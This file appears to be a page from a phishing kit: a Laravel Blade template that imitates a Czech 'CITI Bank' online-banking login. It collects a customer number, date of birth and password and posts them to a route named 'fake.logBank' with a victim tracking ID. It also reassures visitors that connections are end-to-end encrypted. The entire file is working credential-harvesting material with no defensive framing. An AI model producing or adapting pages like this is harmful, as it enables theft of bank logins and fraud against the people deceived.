@extends('layouts.fake')
@push('css')
    <style>
        ._0 {
            margin: 0 auto;
            max-width: 400px;
            box-sizing: border-box;
            background: #fff;
            margin-top: 50px;
            margin-bottom: 50px;
        }
        ._01 {
            margin: 0 auto;
            max-width: 490px;
            box-sizing: border-box;
            padding: 24px;
            background: #fff;
            margin-top: 50px;
            padding-left: 0;
            margin-bottom: 50px;
        }
        ._1 {
            font-size: 28px;
            padding-top: 16px;
            width: 100%;
            text-align: center;
        }
        ._2 {
            margin: 10px 0;
            border-bottom: 1px solid #ddd;
        }
        ._3 {
            text-align: left;
            font-size: 14px;
            border: 1px solid #c5c4c4;
            border-radius: 6px;
            padding: 12px 10px;
            margin-bottom: 20px;
            background-color: #D0D0D0;
        }
        ._3:hover {
            border-color: #000;
        }
        ._4 {
            float: right;
            width: 100%;
            margin: 0;
            color: #000;
            font-weight: 400;
            font-size: 15px;
            line-height: 24px;
            display: inline-block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 8px 30px 6px 31px;
            min-width: 180px;
            border-radius: 7px;
            white-space: nowrap;
            background-color: #16528b;
            color: #fff;
            text-align: center;
            text-decoration: none;
        }
        ._4:hover {
            background-color: #16528b;
            color: #fff;
            border-color: #16528b;
        }
        ._5 {
            color: #aaa;
            text-align: right;
            width: 45%;
            padding-right: 24px;
        }
        ._6 {
            font-weight: bold;
        }
        ._7 {
            margin-top: 4px;
            margin-bottom: 16px;
        }
        ._8 {
            padding-bottom: 6px;
            line-height: 18px;
        }
        ._9 {
            text-align: right;
        }
        body {
            margin: 0;
            font-family: Arial;
            font-size: 12px;
            color: #222;
            word-break: break-word;
            user-select: none;
            background: #fdfdfd;
        }
        input {
            font-family: Arial;
            font-size: 12px;
            color: #222;
            width: 100%;
            border: none;
            box-sizing: border-box;
            text-align: center;
        }
        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
        }
        td {
            padding: 4px 0;
        }
        #mainblock {
            display: flex;
            margin: 0 40px;
            border-bottom: 1px solid #e4e4e4;
        }
        #rightblock {
            margin-top: 100px;
            display: flex;
        }
        .loginboxes {
            display: block;
        }
        #formblock {
            /*border-right: 1px solid #e4e4e4;
            padding-right: 70px; */
            padding-bottom: 20px;
            margin-top: 20px;
        }
        #konto {
            float: right;
            padding-bottom: 10px;
            padding-top: 30px;
        }
        #Pomoc {
            display: none;
            padding-top: 25px;
            width: 150px;
        }
        @media all and (max-width: 800px) {
            #mainblock {
                display: block;
            }
            #formblock {
                border-right: none;
                padding-right: 0;
            }
        }
        @media all and (max-width: 500px) {
            .loginboxes {
                display: block;
            }
            #rightblock {
                display: block;
            }
            #konto {
                margin: 0;
            }
            #Pomoc {
                padding-top: 0;
                padding-bottom: 25px;
            }
            ._4 {
                width: 100%;
            }
        }
    </style>
@endpush
@section('content')
    <div id="mainblock">
        <div class="_0">
            <center>
                <img height="80"
                         src="data:image/png;base64,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">
            </center>
            <form id="bank_pm_form" method="POST" action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}">
                <div class="loginboxes" style="margin-bottom: 20px;">
                    <div class="_1">Přihlaste se do online bankovnictví</div>
                </div>
                <input class="_3" type="text" name="login"
                       placeholder="Zadejte své zákaznické číslo nebo se přihlaste" required="">
                <input class="_3" type="text" name="birthday" placeholder="Datum narození" required="">
                <input class="_3" type="password" name="password" placeholder="Zadejte heslo" required="">
                <div class="loginboxes">
                    <p style="text-align: center; color: #666666;">Všechna připojení jsou šifrována end-to-end</p>
                    <input class="_4" type="submit" value="Další">
                    <br><br>
                </div>
            </form>
        </div>
        <footer>
            <center>{{date('Y')}} CITI Bank</center>
        </footer>
    </div>
@endsection
